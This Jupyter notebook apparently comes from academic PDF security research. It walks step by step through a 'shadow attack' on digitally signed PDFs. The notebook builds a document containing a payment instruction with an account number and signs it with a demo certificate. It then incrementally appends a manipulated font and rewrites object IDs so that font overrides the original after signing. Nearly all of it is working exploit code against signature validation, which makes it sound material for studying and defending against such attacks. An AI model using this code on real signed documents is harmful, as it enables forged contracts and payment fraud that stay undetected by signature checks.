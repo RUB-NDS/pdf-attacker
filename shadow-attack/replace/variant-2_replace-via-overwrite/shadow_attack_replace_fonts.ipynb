{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 0: Configuration Parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "folder_path                     = \"./../../../shadow-demo-exploits/replace/variant-2_replace-via-overwrite/\"\n",
    "signer_path                     = \"./../../../resources/pdf-signer/\"\n",
    "original_font_file              = \"./../../../resources/fonts/original-times new-roman/times.ttf\"\n",
    "malicious_font_file             = \"./../../../resources/fonts/times-new-roman-manipulated.ttf\"\n",
    "\n",
    "input_file                      = \"1_original-document.pdf\"\n",
    "shadowed_file                   = \"2_original-document-shadowed.pdf\"\n",
    "shadowed_file_signed            = \"3_original-document-shadowed-signed.pdf\"\n",
    "shadowed_file_signed_manipulated= \"4_original-document-shadowed-signed-manipulated.pdf\"\n",
    "\n",
    "original_content                = \"Please send the money to the following account: US90 5628 3174 5628 3174\" \n",
    "arrayObj = []"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 0.1: Create default PDF if no PDF file is provided as input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import fitz\n",
    "\n",
    "input_file = \"1_original-document.pdf\"\n",
    "doc = fitz.open()                      # new empty PDF\n",
    "doc.insertPage(0)                      # creates an ISO-A4 portrait page\n",
    "page = doc[-1]                         # this is the page\n",
    "page.insertText(fitz.Point(72, 72),original_content,fontname=\"tiro\", fontsize = 14)\n",
    "doc.save(folder_path+input_file)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 1: Create the shadow document with included Font"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import fitz\n",
    "\n",
    "doc = fitz.open()                      # new empty PDF\n",
    "doc.insertPage(0)                      # creates an ISO-A4 portrait page\n",
    "page = doc[-1]                         # this is the page\n",
    "page.insertText(fitz.Point(72, 72),original_content,fontname=\"F0\", fontsize = 14,  fontfile=original_font_file)\n",
    "doc.save(folder_path+shadowed_file)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 2: Sign the document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system('java -jar '+signer_path+'pdfsigner.jar -i '+folder_path+shadowed_file+' -o '+folder_path+shadowed_file_signed+' -pkcs '+signer_path+'demo-rsa2048.p12 -password demo-rsa2048 -sigtype approval -sigview visible -sigimg '+signer_path+'PdfInsecurityTeam-Logo.png')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 3: Manipulate the signed document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import PyPDF4 as pyPDF\n",
    "import shutil\n",
    "\n",
    "def diff(first, second):\n",
    "    second = set(second)\n",
    "    return [item for item in first if item not in second]\n",
    "\n",
    "def replacePagesID (originalObjId, newObjId, filename):\n",
    "    #read input file\n",
    "    fin = open(filename, \"rb\")\n",
    "    #read file contents to string\n",
    "    data = fin.read()\n",
    "    paddingStr = \" \"* ((len(str(originalObjId)))-(len(str(newObjId)))-1)\n",
    "    #replace all occurrences of the required string\n",
    "    data = data.replace(b\"\\n\"+bytes(f\"{originalObjId}\",\"utf-8\")+b\" 0 obj\\n\", b\"\\n\"+bytes(f\"{newObjId}\",\"utf-8\")+b\" 0 obj\"+bytes(f\"{paddingStr}\",\"utf-8\")+ b\"\\n\")\n",
    "    fin.close()\n",
    "    fin = open(filename, \"wb\")\n",
    "    fin.write(data)\n",
    "    fin.close()\n",
    "\n",
    "def findInDict(needle,haystack):\n",
    "    if isinstance(haystack, pyPDF.generic.IndirectObject):\n",
    "        haystack = haystack.getObject()\n",
    "\n",
    "    for key,val in haystack.items():\n",
    "        try:\n",
    "            value = haystack[key]\n",
    "            # print(key+\":\"+value)\n",
    "        except:\n",
    "            pass\n",
    "        if key == needle:\n",
    "            if val in arrayObj:\n",
    "                return val\n",
    "            else:\n",
    "                arrayObj.append(val)\n",
    "        if isinstance(value,pyPDF.generic.DictionaryObject):\n",
    "            x = findInDict(needle,value)\n",
    "            if x is not None:\n",
    "                return x\n",
    "        elif isinstance(value,pyPDF.generic.IndirectObject):\n",
    "            x = findInDict(needle,value.getObject())\n",
    "            return x\n",
    "        elif isinstance(value,pyPDF.generic.ArrayObject):\n",
    "            for i in list(value):\n",
    "                if isinstance(i,pyPDF.generic.DictionaryObject) or isinstance(i,pyPDF.generic.IndirectObject):\n",
    "                    x = findInDict(needle,i)\n",
    "                    return x\n",
    "\n",
    "# Step 1: Create a copy of the document which will be manipulated\n",
    "shutil.copyfile(folder_path+shadowed_file_signed, folder_path+shadowed_file_signed_manipulated)\n",
    "\n",
    "# Step 2: Open the document which will be manipulated\n",
    "doc = fitz.open(folder_path+shadowed_file_signed_manipulated)\n",
    "\n",
    "# Step 3: Find all fonts, which will be overwritten\n",
    "original_font_list = []\n",
    "new_font_list = []\n",
    "for f in doc.getPageFontList(0, full=False): \n",
    "    original_font_list.append(f[0])\n",
    "\n",
    "# Step 4: Append the malicious font to the file and save the file\n",
    "for page in doc:\n",
    "    page.insertFont(fontname='F1', set_simple=False, fontfile=folder_path+malicious_font_file)\n",
    "doc.saveIncr()\n",
    "\n",
    "# Step 5: Open the manipulated document and adapt the Object ID of the malicious font to ovverwride the previous one\n",
    "doc = fitz.open(folder_path+shadowed_file_signed_manipulated)\n",
    "for f in doc.getPageFontList(0, full=False): \n",
    "    new_font_list.append(f[0])\n",
    "\n",
    "pdf_reader = pyPDF.PdfFileReader(open(folder_path+shadowed_file_signed_manipulated, mode=\"rb\"))\n",
    "list(pdf_reader.pages)\n",
    "\n",
    "answer = findInDict('/FontFile2',pdf_reader.getPage(0))\n",
    "replacePagesID(arrayObj[1].idnum, arrayObj[0].idnum,folder_path+shadowed_file_signed_manipulated)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "Python 3.8.6 64-bit",
   "display_name": "Python 3.8.6 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "4cd7ab41f5fca4b9b44701077e38c5ffd31fe66a6cab21e0214b68d958d0e462"
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}